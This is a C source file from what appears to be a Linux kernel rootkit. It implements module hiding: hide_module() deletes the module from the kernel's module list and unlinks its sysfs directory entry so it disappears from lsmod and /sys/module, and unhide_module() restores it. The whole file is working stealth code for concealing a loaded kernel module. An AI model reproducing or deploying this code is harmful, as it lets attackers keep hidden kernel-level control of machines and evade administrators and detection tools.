#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/fs.h>
#include <linux/sysfs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_module.h"

static int hidden = 0;


/**
 * Taken from fs/sysfs/sysfs.h
 */
struct sysfs_elem_dir {
        struct kobject          *kobj;
        /* children list starts here and goes through sd->s_sibling */
        struct sysfs_dirent     *children;
};

struct sysfs_elem_symlink {
        struct sysfs_dirent     *target_sd;
};

struct sysfs_elem_attr {
        struct attribute        *attr;
        struct sysfs_open_dirent *open;
};

struct sysfs_elem_bin_attr {
        struct bin_attribute    *bin_attr;
        struct hlist_head       buffers;
};

struct sysfs_inode_attrs {
        struct iattr    ia_iattr;
        void            *ia_secdata;
        u32             ia_secdata_len;
};

struct sysfs_dirent {
        atomic_t                s_count;
        atomic_t                s_active;
        struct sysfs_dirent     *s_parent;
        struct sysfs_dirent     *s_sibling;
        const char              *s_name;

        union {
                struct sysfs_elem_dir           s_dir;
                struct sysfs_elem_symlink       s_symlink;
                struct sysfs_elem_attr          s_attr;
                struct sysfs_elem_bin_attr      s_bin_attr;
        };

        unsigned int            s_flags;
        ino_t                   s_ino;
        umode_t                 s_mode;
        struct sysfs_inode_attrs *s_iattr;
};

static void sysfs_unlink_sibling(struct sysfs_dirent *sd)
{
        struct sysfs_dirent **pos;

        for (pos = &sd->s_parent->s_dir.children; *pos;
             pos = &(*pos)->s_sibling) {
                if (*pos == sd) {
                        *pos = sd->s_sibling;
                        sd->s_sibling = NULL;
                        break;
                }
        }
}

void remove_from_sysfs_list(void){
    sysfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);
}

void sysfs_link_sibling(struct sysfs_dirent *sd)
{
        struct sysfs_dirent *parent_sd = sd->s_parent;
        struct sysfs_dirent **pos;

        BUG_ON(sd->s_sibling);

        /* Store directory entries in order by ino.  This allows
         * readdir to properly restart without having to add a
         * cursor into the s_dir.children list.
         */
        for (pos = &parent_sd->s_dir.children; *pos; pos = &(*pos)->s_sibling) {
                if (sd->s_ino < (*pos)->s_ino)
                        break;
        }
        sd->s_sibling = *pos;
        *pos = sd;
}

void reinsert_to_sysfs_list(void){
    sysfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);
}


/*
 * Hiding a module is basically just removing it from the list of modules
 */
void hide_module(void)
{
    if(hidden == 1)
        return;
    list_del(&(THIS_MODULE->list));
    remove_from_sysfs_list();

    hidden = 1;
}


void unhide_module(void)
{
    if(hidden == 0)
        return;

    list_add(&(THIS_MODULE->list), (struct list_head *) ptr_modules);
    reinsert_to_sysfs_list();

    hidden = 0;
}
